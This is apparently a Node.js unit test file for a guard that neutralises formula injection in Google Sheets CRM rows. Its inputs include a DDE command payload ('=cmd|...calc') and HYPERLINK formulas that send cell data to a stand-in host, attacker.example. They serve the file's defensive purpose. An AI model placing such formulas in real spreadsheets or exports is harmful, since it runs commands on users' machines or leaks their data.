// ═══════════════════════════════════════════════════════════════════════════
// Unit tests for server/lib/sheetsCsvGuard.js — CSV/formula injection guard
//
// Run: node tests/sheetsCsvGuard.test.js
// ═══════════════════════════════════════════════════════════════════════════

import { google } from "googleapis";
import { sanitizeCellValue } from "../server/lib/sheetsCsvGuard.js";

let passed = 0;
let failed = 0;

function assert(cond, label) {
  if (cond) { passed++; }
  else { failed++; console.error(`  ✗ ${label}`); }
}

function group(name, fn) {
  console.log(`\n— ${name}`);
  return fn();
}

// ── leading formula trigger characters ──────────────────────────────────────

group("prefixes leading = / + / - / @ / tab / CR with apostrophe", () => {
  assert(sanitizeCellValue("=cmd|'/c calc'!A1") === "'=cmd|'/c calc'!A1", "= prefixed");
  assert(sanitizeCellValue("+1234") === "'+1234", "+ prefixed");
  assert(sanitizeCellValue("-100") === "'-100", "- prefixed");
  assert(sanitizeCellValue("@SUM(A1:A10)") === "'@SUM(A1:A10)", "@ prefixed");
  assert(sanitizeCellValue("\tinjected") === "'\tinjected", "tab prefixed");
  assert(sanitizeCellValue("\rinjected") === "'\rinjected", "CR prefixed");
});

group("HYPERLINK exfiltration payload — the canonical attack", () => {
  const payload = '=HYPERLINK("http://attacker.example/?d="&A1,"click")';
  const out = sanitizeCellValue(payload);
  assert(out === "'" + payload, "HYPERLINK payload prefixed");
  assert(out.charAt(0) === "'", "first char is apostrophe");
});

group("does NOT touch safe values", () => {
  assert(sanitizeCellValue("Juan Pérez") === "Juan Pérez", "name unchanged");
  assert(sanitizeCellValue("https://example.com") === "https://example.com", "URL unchanged");
  assert(sanitizeCellValue("099 123 456") === "099 123 456", "phone unchanged");
  assert(sanitizeCellValue("USD 1234.50") === "USD 1234.50", "money unchanged");
  assert(sanitizeCellValue("a=b") === "a=b", "= in middle unchanged");
});

group("handles edge cases", () => {
  assert(sanitizeCellValue("") === "", "empty string returns empty");
  assert(sanitizeCellValue(null) === "", "null returns empty");
  assert(sanitizeCellValue(undefined) === "", "undefined returns empty");
  assert(sanitizeCellValue(0) === "0", "number coerced to string");
  assert(sanitizeCellValue(false) === "false", "boolean coerced to string");
});

group("idempotent — sanitizing twice does not double-prefix", () => {
  // Note: a cell that starts with `'` followed by `=` is NOT considered unsafe
  // by Sheets — the apostrophe IS the literal-text marker. So sanitize(sanitize(x))
  // == sanitize(x) is the desired behavior because the second pass sees `'=…`
  // which starts with `'` (safe), not `=`.
  const once = sanitizeCellValue("=evil");
  const twice = sanitizeCellValue(once);
  assert(once === twice, `idempotent: ${once} === ${twice}`);
});

// ── integration: real Sheets writers use the guard ───────────────────────────

const realGoogleAuth = google.auth.GoogleAuth;
const realGoogleSheets = google.sheets;

function installSheetsStub(stub) {
  google.auth.GoogleAuth = class {
    async getClient() {
      return { ok: true, stub: "sheets-auth-client" };
    }
  };
  google.sheets = () => stub;
}

function restoreSheetsStub() {
  google.auth.GoogleAuth = realGoogleAuth;
  google.sheets = realGoogleSheets;
}

await group("appendQuoteToCrm sanitizes user-controlled CRM cells before append", async () => {
  const captured = { appends: [] };
  const { config } = await import("../server/config.js");
  const previousSheetId = config.bmcSheetId;
  installSheetsStub({
    spreadsheets: {
      values: {
        get: async () => ({ data: { values: [] } }),
        append: async (req) => {
          captured.appends.push(req);
          return { data: { updates: { updatedRange: "'CRM_Operativo'!B4:AK4" } } };
        },
      },
    },
  });

  try {
    config.bmcSheetId = "test-crm-sheet";

    const { appendQuoteToCrm } = await import("../server/lib/crmAppend.js");
    const result = await appendQuoteToCrm({
      cliente: "=cmd|'/c calc'!A1",
      telefono: "+59899123456",
      ubicacion: "@Montevideo",
      vendedor: "=Admin",
      tipo_cliente: "-VIP",
      urgencia: "@Alta",
      probabilidad_cierre: "+80",
      observaciones: '=HYPERLINK("http://attacker.example/?d="&A1,"click")',
      drive_url: "=HYPERLINK(\"http://attacker.example/drive\")",
      scenario: "solo_techo",
      lista: "web",
      total: 1234.56,
    });

    assert(result.ok === true, "appendQuoteToCrm succeeds with stubbed Sheets");
    assert(captured.appends.length === 1, "one Sheets append was issued");

    const row = captured.appends[0].requestBody.values[0];
    assert(row[1] === "'=cmd|'/c calc'!A1", "cliente sanitized in CRM row");
    assert(row[2] === "'+59899123456", "telefono sanitized in CRM row");
    assert(row[3] === "'@Montevideo", "ubicacion sanitized in CRM row");
    assert(row[9] === "'=Admin", "vendedor sanitized in CRM row");
    assert(row[16] === "'+80", "probabilidad sanitized in CRM row");
    assert(row[17] === "'@Alta", "urgencia sanitized in CRM row");
    assert(row[20] === "'-VIP", "tipo_cliente sanitized in CRM row");
    assert(row[21].startsWith("'=HYPERLINK("), "observaciones composite sanitized");
    assert(row[32].startsWith("'=HYPERLINK("), "AH quote link sanitized when sourced from drive_url");
    assert(captured.appends[0].valueInputOption === "USER_ENTERED", "append still uses USER_ENTERED");
  } finally {
    config.bmcSheetId = previousSheetId;
    restoreSheetsStub();
  }
});

// ── summary ──────────────────────────────────────────────────────────────────

console.log(`\n${"═".repeat(60)}`);
console.log(`sheetsCsvGuard tests — passed: ${passed}, failed: ${failed}`);
console.log("═".repeat(60));
if (failed > 0) process.exit(1);
